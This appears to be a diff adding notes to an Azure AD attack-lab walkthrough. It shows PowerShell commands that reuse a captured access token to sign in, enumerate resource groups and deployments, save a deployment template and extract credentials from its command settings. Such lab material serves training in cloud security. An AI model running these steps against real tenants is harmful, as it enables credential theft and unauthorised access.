@@ -1077,4 +1077,20 @@ def main(req: func.HttpRequest) -> func.HttpResponse:
 	return func.HttpResponse(val, status_code=200)
 ```
 
+This is just yet another curl request for an acess token, which we can execute in the CI/CD Pipeline by navigating to - ```https://simpleapps.azurewebsites.net/api/Student213``` 
 
+```
+Connect-AzAccount -AccessToken $AccessToken -AccountId 95f40eea-6653-4e11-b545-d9c2f5f90a29
+
+Get-AzResourceGroup 
+Get-AzResourceGroupDeployment -ResourceGroupName SAP
+```
+Save the deployment template locally. Run the below command:
+```
+Save-AzResourceGroupDeploymentTemplate -ResourceGroupName SAP -DeploymentName stevencking_defcorphq.onmicrosoft.com.sapsrv
+```
+
+Use the below command to quickly look for credentials:
+```
+(cat C:\AzAD\Tools\stevencking_defcorphq.onmicrosoft.com.sapsrv.json |ConvertFrom-Json |select -ExpandProperty Resources).resources.Properties.Settings.CommandToExecute
+```
